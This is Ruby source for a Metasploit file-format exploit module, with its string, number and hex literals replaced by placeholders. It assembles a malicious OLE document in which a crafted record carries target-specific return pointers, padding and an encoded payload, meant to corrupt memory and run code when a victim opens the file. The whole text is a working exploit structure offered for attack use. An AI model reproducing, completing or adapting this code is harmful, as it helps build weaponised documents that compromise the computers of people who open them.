require <str> require <str> class Metasploit3 < Msf :: Exploit :: Remote Rank = GoodRanking include Msf :: Exploit :: FILEFORMAT def initialize ( info = { } ) super ( update_info ( info , <str> = > <str> , <str> = > <str> , <str> = > MSF_LICENSE , <str> = > [ <str> , <str> ] , <str> = > [ [ <str> , <str> ] , [ <str> , <str> ] , [ <str> , <str> ] , [ <str> , <str> ] , [ <str> , <str> ] , [ <str> , <str> ] ] , <str> = > { <str> = > <str> , <str> = > <str> , } , <str> = > { <str> = > <int> , <str> = > <str> , <str> = > true } , <str> = > <str> , <str> = > [ [ <str> , { <str> = > <hex> } ] , [ <str> , { <str> = > <hex> } ] , [ <str> , { <str> = > <hex> } ] , [ <str> , { <str> = > <hex> } ] , [ <str> , { <str> = > <hex> } ] ] , <str> = > <str> ) ) register_options ( [ OptString . new ( <str> , [ true , <str> , <str> ] ) , OptString . new ( <str> , [ true , <str> , Msf :: Config . local_directory ] ) , ] , self . class ) end def add_record ( tag , data = nil ) ret = <str> ret << Rex :: OLE :: Util . pack16 ( tag ) data || = <str> ret << Rex :: OLE :: Util . pack16 ( data . length ) ret << data ret end def exploit ptr1 = target [ <str> ] ptr2 = ptr1 + <int> ptr3 = ptr2 + <int> ptr4 = ptr3 + <int> bofdata = <str> bofdata << Rex :: OLE :: Util . pack16 ( <hex> ) bofdata << Rex :: OLE :: Util . pack16 ( <hex> ) bofdata << Rex :: OLE :: Util . pack16 ( <hex> ) bofdata << Rex :: OLE :: Util . pack16 ( <hex> ) bofdata << Rex :: OLE :: Util . pack32 ( <hex> ) bofdata << Rex :: OLE :: Util . pack32 ( <hex> ) feathdr = <str> feathdr << Rex :: OLE :: Util . pack16 ( <hex> ) feathdr << <str> * ( <int> ) feathdr << Rex :: OLE :: Util . pack16 ( <hex> ) feathdr << <str> feathdr << Rex :: OLE :: Util . pack32 ( <hex> ) feathdr << [ ptr1 ] . pack ( <str> ) feathdr << rand_text_alphanumeric ( <int> ) feathdr << [ ptr2 ] . pack ( <str> ) feathdr << [ ptr3 - <hex> ] . pack ( <str> ) feathdr << [ ptr4 ] . pack ( <str> ) feathdr << payload . encoded content = <str> content << add_record ( <hex> , bofdata ) content << add_record ( <hex> , feathdr ) content << add_record ( <hex> ) print_status ( <str> ) out = File . join ( File . join ( datastore [ <str> ] , datastore [ <str> ] ) ) stg = Rex :: OLE :: Storage . new ( out , Rex :: OLE :: STGM_WRITE ) if ( not stg ) fail_with ( Failure :: Unknown , <str> ) end stm = stg . create_stream ( <str> ) if ( not stm ) fail_with ( Failure :: Unknown , <str> ) end stm << content stm . close stg . close print_status ( <str> out <str> ) end end 
